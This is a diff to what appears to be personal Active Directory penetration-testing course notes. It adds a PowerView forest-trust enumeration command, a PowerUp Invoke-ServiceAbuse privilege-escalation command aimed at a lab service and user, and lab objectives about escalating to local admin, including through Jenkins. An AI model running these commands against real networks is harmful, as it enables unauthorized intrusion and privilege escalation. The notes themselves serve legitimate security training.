@@ -90,6 +90,8 @@ Get-NetForestCatalog / Get-NetForestCatalog –Forest eurocorp.local (Get all gl
 
 Get-NetForestTrust / Get-NetForestTrust –Forest "forestname" (Map trusts of a forest)
 
+Get-NetForestDomain -Verbose | Get-NetDomainTrust (GET ALL TRUST OF A FOREST)
+
 # User Hunting
 
 /!\ really noisy /!\
@@ -109,6 +111,8 @@ Invoke-UserHunter -Stealth (Find computers where a domain admin is logged-in)
 # Priv Esc
 
 PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+exploit: Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student202'
 
 Invoke-AllChecks
 
@@ -158,6 +162,20 @@ coming ...
 - Map External trusts in moneycorp.local forest.
 
 - Identify external trusts of dollarcorp domain. Can you enumerate trusts for a trusting forest?
+
+-----------------------------------------
+
+- Exploit a service on dcorp-studentx and elevate privileges to local administrator.
+
+- Identify a machine in the domain where studentx has local administrative access.
+
+- Using privileges of a user on Jenkins on 172.16.3.11:8080, get admin privileges on 172.16.3.11 - the dcorp-ci server.
+
+-----------------------------------------
+
+
+-----------------------------------------
+
 
 -----------------------------------------
 
